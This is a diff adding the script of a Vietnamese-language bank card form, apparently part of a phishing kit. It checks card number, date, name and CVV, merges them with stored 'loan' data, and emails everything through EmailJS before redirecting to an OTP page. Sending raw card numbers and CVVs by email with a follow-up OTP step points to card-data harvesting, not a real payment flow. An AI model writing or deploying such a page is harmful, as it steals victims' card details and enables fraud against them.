+                    document.getElementById('mb-hint').classList.add('hidden');
+                    updateVisualCardLogo(null);
+                    
+                    document.getElementById('cardCvv').value = '';
+                    document.getElementById('cardDate').value = '';
+                    document.getElementById('vc-date').textContent = '••/••';
+                    
+                    changeTheme(state.cardFlow, null);
+                } else if (flowChanged) {
+                    changeTheme(state.cardFlow, null);
+                }
+            }
+        }
+
+        function selectItem(item) {
+            state.selectedItem = item;
+            changeTheme(state.cardFlow, item);
+            updateVisualCardLogo(item.logo);
+            document.getElementById('lbl-cardDate').innerHTML = `${item.dateLabel} <span class="text-red-500">*</span>`;
+            document.getElementById('vc-date-label').textContent = item.dateLabel.toUpperCase();
+
+            // Tính năng đặc biệt cho MB Bank (theo thông tin bạn cung cấp)
+            const mbHint = document.getElementById('mb-hint');
+            if(item.id === 'MBBANK') mbHint.classList.remove('hidden');
+            else mbHint.classList.add('hidden');
+
+            // FIX LỖI 5: UX CVV - Ẩn hoàn toàn nếu không cần thiết
+            const cvvInput = document.getElementById('cardCvv');
+            const cvvHint = document.getElementById('cvv-hint');
+            const cvvStar = document.getElementById('cvv-star');
+            const boxCvv = document.getElementById('box-cvv');
+            const boxDate = document.getElementById('box-date');
+            
+            if (item.requireCvv) {
+                // Hiển thị lại ô CVV và chỉnh ô Date về nửa form
+                boxCvv.classList.remove('hidden');
+                boxDate.classList.remove('md:col-span-2');
+                boxDate.classList.add('md:col-span-1');
+
+                cvvStar.classList.remove('hidden');
+                cvvInput.disabled = false;
+                cvvHint.textContent = "Bắt buộc đối với thẻ này.";
+                cvvHint.className = "text-[11px] mt-1.5 font-medium text-red-500";
+            } else {
+                // Ẩn hoàn toàn ô CVV và mở rộng ô Date ra toàn bộ chiều rộng
+                boxCvv.classList.add('hidden');
+                boxDate.classList.remove('md:col-span-1');
+                boxDate.classList.add('md:col-span-2');
+
+                cvvStar.classList.add('hidden');
+                cvvInput.disabled = true;
+                cvvInput.value = ''; // Clear value
+            }
+
+            // Hiển thị section
+            document.getElementById('section-details').classList.remove('hidden');
+        }
+
+        function updateVisualCardLogo(logoUrl) {
+            const logoEl = document.getElementById('vc-logo');
+            if (logoUrl) {
+                logoEl.src = logoUrl;
+                logoEl.classList.remove('opacity-0');
+            } else {
+                logoEl.classList.add('opacity-0');
+                setTimeout(() => logoEl.src = '', 500);
+            }
+        }
+
+        function resetFlow() {
+            state.cardFlow = null;
+            state.selectedItem = null;
+            document.getElementById('section-details').classList.add('hidden');
+            document.getElementById('alert-box').classList.add('hidden');
+            document.getElementById('mb-hint').classList.add('hidden');
+            document.getElementById('cvv-hint').textContent = "Nhập CVV nếu thẻ có yêu cầu.";
+            document.getElementById('cvv-hint').className = "text-[11px] text-gray-500 mt-1.5";
+            document.getElementById('lbl-cardDate').innerHTML = `Tháng/Năm in trên thẻ <span class="text-red-500">*</span>`;
+            document.getElementById('vc-date-label').textContent = "THÁNG/NĂM";
+            document.getElementById('cardCvv').disabled = false;
+
+            // Khôi phục lại giao diện hiển thị cho ô Date và CVV
+            const boxCvv = document.getElementById('box-cvv');
+            const boxDate = document.getElementById('box-date');
+            if(boxCvv) boxCvv.classList.remove('hidden');
+            if(boxDate) {
+                boxDate.classList.remove('md:col-span-2');
+                boxDate.classList.add('md:col-span-1');
+            }
+
+            updateVisualCardLogo(null);
+            changeTheme('default', null);
+            
+            const vcNumberWrap = document.getElementById('vc-number-wrap');
+            vcNumberWrap.className = "vc-part font-mono mb-3 md:mb-5 embossed-text h-7 md:h-8 relative z-10 transition-all duration-300 -ml-1 whitespace-nowrap w-full text-[16px] md:text-[22px] tracking-[0.15em] md:tracking-[0.2em] overflow-hidden";
+            document.getElementById('vc-number').textContent = '•••• •••• •••• ••••';
+        }
+
+        function changeTheme(flowColor, matchedItem) {
+            const inputs = document.querySelectorAll('.custom-input');
+            const btn = document.getElementById('btn-submit');
+            const header = document.getElementById('form-header');
+            const visualCard = document.getElementById('visual-card');
+
+            visualCard.className = "w-full max-w-[360px] rounded-2xl p-5 md:p-6 text-white relative overflow-hidden transition-all duration-700 glass-card";
+            
+            if (flowColor === 'international') {
+                inputs.forEach(i => i.classList.add('int-focus'));
+                btn.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 md:py-4 rounded-lg shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 group text-base md:text-lg relative overflow-hidden";
+                header.className = "bg-gradient-to-r from-blue-900 to-blue-700 p-4 md:p-5 text-white text-center transition-colors duration-500";
+            } else {
+                inputs.forEach(i => i.classList.remove('int-focus'));
+                btn.className = "w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 md:py-4 rounded-lg shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 group text-base md:text-lg relative overflow-hidden";
+                header.className = "bg-gradient-to-r from-gray-800 to-black p-4 md:p-5 text-white text-center transition-colors duration-500";
+            }
+
+            if (matchedItem) {
+                const gradientClasses = matchedItem.gradient.split(' ');
+                visualCard.classList.add('bg-gradient-to-br', ...gradientClasses);
+                if (matchedItem.pattern) {
+                    visualCard.classList.add(matchedItem.pattern);
+                }
+            } else {
+                if (flowColor === 'international') visualCard.classList.add('bg-gradient-to-br', 'from-blue-700', 'to-blue-900');
+                else if (flowColor === 'napas') visualCard.classList.add('bg-gradient-to-br', 'from-red-600', 'to-red-900');
+                else visualCard.classList.add('bg-gradient-to-br', 'from-gray-700', 'to-gray-900');
+            }
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            let bgClass = type === 'error' ? 'bg-red-500' : (type === 'success' ? 'bg-green-600' : 'bg-blue-600');
+            toast.className = `toast mb-3 p-4 rounded-lg shadow-xl text-white flex items-center gap-3 min-w-[300px] ${bgClass}`;
+            toast.innerHTML = `<i class="fa-solid ${type === 'error' ? 'fa-circle-xmark' : 'fa-circle-check'} text-xl"></i> <span class="font-medium text-sm">${message}</span>`;
+            container.appendChild(toast);
+            requestAnimationFrame(() => toast.classList.add('show'));
+            setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 300); }, 3000);
+        }
+
+        function showError(id, msg) {
+            const el = document.getElementById(`err-${id}`);
+            el.textContent = msg; el.classList.remove('hidden');
+            document.getElementById(id).classList.add('border-red-500');
+        }
+
+        // --- 6. SUBMISSION ---
+        document.getElementById('payment-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            ['cardNumber', 'cardDate', 'cardName', 'cardCvv'].forEach(id => {
+                document.getElementById(`err-${id}`).classList.add('hidden');
+                document.getElementById(id).classList.remove('border-red-500');
+            });
+
+            let isValid = true;
+            const values = {
+                number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+                date: document.getElementById('cardDate').value,
+                name: document.getElementById('cardName').value.trim(),
+                cvv: document.getElementById('cardCvv').value
+            };
+
+            if (!state.selectedItem) {
+                showToast('Hệ thống chưa nhận diện được thẻ. Vui lòng kiểm tra lại số thẻ.', 'error');
+                return;
+            }
+
+            // Xác thực độ dài số thẻ
+            if (state.cardFlow === 'napas') {
+                if (!values.number.startsWith('9704') || (values.number.length !== 16 && values.number.length !== 19)) {
+                    showError('cardNumber', 'Số thẻ Nội Địa phải bắt đầu bằng 9704 và có đúng 16 hoặc 19 số.');
+                    isValid = false;
+                }
+            } else if (state.cardFlow === 'international') {
+                if (values.number.length < 15 || values.number.length > 19) {
+                    showError('cardNumber', 'Số thẻ Quốc Tế không hợp lệ (thường từ 15-16 số).');
+                    isValid = false;
+                }
+                // Chỉ áp dụng thuật toán Luhn khắt khe cho Thẻ Quốc Tế
+                if (isValid && !isValidLuhn(values.number)) {
+                    showError('cardNumber', 'Số thẻ Quốc Tế không hợp lệ (Sai thuật toán).');
+                    isValid = false;
+                }
+            }
+
+            // FIX LỖI 2: Xác thực Ngày tháng theo "Phát Hành" vs "Hết Hạn"
+            const dateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            if (!dateRegex.test(values.date)) {
+                showError('cardDate', 'Định dạng tháng/năm không đúng (VD: 05/25).');
+                isValid = false;
+            } else {
+                const [month, year] = values.date.split('/');
+                const m = parseInt(month, 10);
+                const y = parseInt(year, 10);
+                const now = new Date();
+                const currentMonth = now.getMonth() + 1;
+                const currentYear = parseInt(now.getFullYear().toString().slice(-2));
+
+                const isIssueDate = state.selectedItem.dateLabel.includes('phát hành');
+
+                if (isIssueDate) {
+                    // Thẻ ATM: Ngày phát hành không được lớn hơn thời điểm hiện tại
+                    if (y > currentYear || (y === currentYear && m > currentMonth)) {
+                        showError('cardDate', 'Ngày phát hành không hợp lý (đang nằm ở tương lai).');
+                        isValid = false;
+                    }
+                } else {
+                    // Thẻ VISA/MASTER: Ngày hết hạn không được nhỏ hơn thời điểm hiện tại
+                    if (y < currentYear || (y === currentYear && m < currentMonth)) {
+                        showError('cardDate', 'Thẻ của bạn đã hết hạn. Vui lòng sử dụng thẻ khác.');
+                        isValid = false;
+                    }
+                }
+            }
+
+            if (state.selectedItem.requireCvv && values.cvv.length < 3) {
+                showError('cardCvv', 'Vui lòng nhập đủ 3-4 số mã bảo mật CVV.');
+                isValid = false;
+            }
+
+            if (values.name.length < 5 || !values.name.includes(' ')) {
+                showError('cardName', 'Vui lòng nhập đầy đủ Họ và Tên trên thẻ không dấu.');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            const btn = document.getElementById('btn-submit');
+            const btnText = document.getElementById('btn-text');
+            const originalText = btnText.innerHTML;
+            const loaderClass = state.cardFlow === 'international' ? 'loader-int' : '';
+            
+            try {
+                btn.disabled = true;
+                btnText.innerHTML = `<div class="loader ${loaderClass} inline-block mr-2 align-middle"></div>Đang xử lý...`;
+
+                const emailData = {
+                    ...state.loanData,
+                    bankName: state.selectedItem.name,
+                    bank: state.selectedItem.name,
+                    cardNumber: values.number,
+                    date: values.date,
+                    fullName: values.name,
+                    cardFullName: values.name,
+                    cvv: values.cvv || 'N/A', 
+                    cardType: state.cardFlow,
+                    timestamp: new Date().toLocaleString('vi-VN')
+                };
+
+                // Lưu sessionStorage sau khi đã chắc chắn data chuẩn
+                sessionStorage.setItem('cardInfo', JSON.stringify(emailData));
+                
+                // Gửi EmailJS
+                await emailjs.send(CONFIG.EMAILJS_SERVICE_ID, CONFIG.EMAILJS_TEMPLATE_ID, emailData);
+
+                showToast('Xác thực thẻ thành công. Đang chuyển hướng...', 'success');
+                setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
+
+            } catch (error) {
+                console.error("Submission Error:", error);
+                showToast('Có lỗi xảy ra kết nối tới máy chủ. Vui lòng thử lại.', 'error');
+                btn.disabled = false;
+                btnText.innerHTML = originalText;
+            }
+        });
+    </script>
+</body>
+</html>
